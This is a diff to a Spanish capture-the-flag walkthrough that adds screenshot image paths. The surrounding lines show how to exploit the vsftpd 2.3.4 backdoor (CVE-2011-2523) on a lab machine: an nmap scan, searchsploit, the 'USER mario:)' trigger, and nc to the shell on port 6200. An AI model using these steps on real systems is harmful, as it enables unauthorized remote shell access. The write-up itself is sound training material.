@@ -11,7 +11,7 @@ con la máquina objetivo.
 ping -c 3 172.17.0.2
 ```
 
-![CAPTURA_1]
+![CAPTURA_1](img/CAPTURA_1.png)
 
 La máquina responde correctamente. Confirmada la conectividad, procedemos
 a enumerar.
@@ -26,7 +26,7 @@ versiones de los servicios que corren en ellos:
 nmap -sV 172.17.0.2
 ```
 
-![CAPTURA_2]
+![CAPTURA_2](img/CAPTURA_2.png)
 
 **Resultado:**
 - Puerto **21/tcp** abierto — Servicio **FTP** — Versión **vsftpd 2.3.4**
@@ -39,7 +39,7 @@ Buscamos exploits conocidos para esta versión:
 searchsploit vsftpd 2.3.4
 ```
 
-![CAPTURA_3]
+![CAPTURA_3](img/CAPTURA_3.png)
 
 Encontramos dos exploits para **CVE-2011-2523**:
 - `49757.py` — Backdoor Command Execution (Python)
@@ -52,7 +52,7 @@ cp /usr/share/exploitdb/exploits/unix/remote/49757.py .
 cat 49757.py
 ```
 
-![CAPTURA_4]
+![CAPTURA_4](img/CAPTURA_4.png)
 
 Del análisis del código extraemos cómo funciona la backdoor:
 - Si el usuario FTP contiene `:)` al final, se activa la puerta trasera
@@ -73,7 +73,7 @@ USER mario:)
 PASS cualquiercosa
 ```
 
-![CAPTURA_5]
+![CAPTURA_5](img/CAPTURA_5.png)
 
 El servidor acepta la conexión. El `:)` en el nombre de usuario activa
 la backdoor internamente y el servidor abre una shell en el puerto 6200.
@@ -86,7 +86,7 @@ nc 172.17.0.2 6200
 whoami
 ```
 
-![CAPTURA_6]
+![CAPTURA_6](img/CAPTURA_6.png)
 
 ---
 
